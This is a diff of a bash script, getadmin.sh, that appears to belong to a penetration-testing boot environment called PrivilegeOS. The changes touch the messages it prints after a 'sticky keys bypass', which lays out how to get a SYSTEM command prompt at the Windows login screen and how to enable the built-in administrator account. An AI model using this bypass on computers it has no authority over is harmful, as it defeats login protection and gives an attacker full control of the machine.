@@ -3,7 +3,7 @@
 # getadmin.sh - Windows Admin Access Script for PrivilegeOS
 # This script finds Windows partitions and performs the sticky keys bypass
 # WARNING: This is for educational/penetration testing purposes only!
-# Updated: 2025-07-06 10:57:45 UTC
+# Updated: 2025-07-09 10:57:45 UTC
 
 # Color codes for output
 RED='\033[0;31m'
@@ -695,14 +695,14 @@ perform_bypass() {
     echo -e "${GREEN}=============================================${NC}"
     echo ""
     echo -e "${YELLOW}IMPORTANT: Please verify the bypass worked:${NC}"
-    echo -e "${YELLOW}1. Keep this Linux session open${NC}"
+    echo -e "${YELLOW}1. Use poweroff command to shutdown the PrivilegeOS${NC}"
     echo -e "${YELLOW}2. Boot Windows normally${NC}"
     if [ "$DELETE_HIBERFIL" -eq 1 ]; then
         echo -e "${YELLOW}3. Windows will perform a cold boot (no hibernation resume)${NC}"
     fi
     echo -e "${YELLOW}4. At the login screen, press Shift key 5 times${NC}"
     echo -e "${YELLOW}5. If you see CMD prompt instead of sticky keys, SUCCESS!${NC}"
-    echo -e "${YELLOW}6. If not, return to this session and check logs${NC}"
+    echo -e "${YELLOW}6. If not, try debugging steps${NC}"
     echo ""
     echo -e "${CYAN}Commands to use in the CMD prompt:${NC}"
     echo -e "${CYAN}- net user administrator /active:yes${NC}"
@@ -711,8 +711,7 @@ perform_bypass() {
     echo ""
     echo -e "${RED}To restore (if needed):${NC}"
     echo -e "${RED}1. Boot back into PrivilegeOS${NC}"
-    echo -e "${RED}2. Mount the Windows partition${NC}"
-    echo -e "${RED}3. Copy sethc.exe.backup back to sethc.exe${NC}"
+    echo -e "${RED}2. Run putadmin command{NC}"
     echo ""
     
     # Final unmount - go back to root directory first
